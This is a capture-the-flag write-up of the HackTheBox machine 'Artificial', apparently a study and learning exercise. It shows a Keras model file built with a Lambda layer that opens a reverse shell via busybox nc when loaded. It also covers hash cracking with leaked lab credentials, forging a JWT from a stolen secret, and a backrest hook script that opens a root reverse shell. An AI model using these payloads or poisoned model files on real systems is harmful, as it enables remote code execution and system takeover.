```json
Alias: Artificial
Date: 27-06_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.74
```

# Artificial
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 19:00 +0500
Nmap scan report for 10.10.11.74
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.25 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration
## Port 80 - HTTP

After registering an account we find out that we can upload and load `hdf5` files (commonly using extension `.h5`) which when loaded can be used to run arbitrary code.

So, get `python3.10` since that is the version of python which can use `tensorflow-cpu==2.13.1` as listed in the `requirements`. This can be done easily using pyenv or just set up a docker.

---

# Exploitation

Create the `hdf5` file

```python
from keras.models import Sequential
from keras.layers import Lambda
import numpy as np

# Lambda layer with RCE (will execute on model load)
model = Sequential([
	# Change IP Port
    Lambda(lambda x: eval("__import__('os').system('busybox nc 10.10.14.112 4444 -e sh')" or "x"), input_shape=(1,))
])

# Initialize weights by calling the model
model(np.zeros((1, 1)))

# Save model
model.save("malicious_model.h5")
```

upload it and press `View Predictions` for it. You should get a shell if you've setup a listener. Next download the `sqlite3` database `/home/app/app/instance/users.db`. Copy `gael`'s MD5 hashed password and crack using `crackstation.net`

| Username | Password          |
| -------- | ----------------- |
| gael     | mattp005numbertwo |

We can now SSH to the box.

---

# Privilege Escalation

Looking at `/opt` we have `backrest`, which is a web UI for `restic`. `restic` is a simple backup program. If we do a `netstat -tuln` we see something running on port 9898, this is the `backrest` web interface. Use chisel or something to tunnel the port to get access.

We are then met with a login panel, doing further enumeration, we see that `gael` is a part of `sysadm` group. Finding files whose group is `sysadm`

```bash
find / -group sysadm 2>/dev/null
```

we find `/var/backups/backrest_backup.tar.gz`. Looking inside, we can get access to the `jwt-secret` and `.config/backrest/config.json` contains

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

We can either crack the password, or craft a `JWT` token using the secret we found. Cracking the bcrypt gives us the password `!@#$%^`. The JWT token can be crafted using

```python
import jwt
import time

# Secret key (HMAC SHA256)
with open('jwt-secret.txt', 'rb') as f:
    secret = f.read().strip()

if not secret:
    raise ValueError("Secret key is empty. Please provide a valid secret in 'jwt-secret.txt'.")

# Payload
payload = {
    'sub': 'backrest_root',
    'exp': int(time.time()) + 3600  # expires in 1 hour
}

# Encode JWT
token = jwt.encode(payload, secret, algorithm='HS256')

print(token)
```

Make sure you have the `jwt-secret.txt`.

Then in local storage we can create a key `backrest-ui-authToken` with the value as the generate token.

Next, to get code execution, create a repo from backrest and add a hook to it which runes before prune start. In the script add

```
/var/tmp/script.sh {{ .ShellEscape .Summary }}
```

Make sure to create `/var/tmp/script.sh` and make it executable.

```bash
#!/bin/bash
busybox nc IP PORT -e sh
```

then navigate to the repo and press Prune Now. We should get a shell as root!


#CTF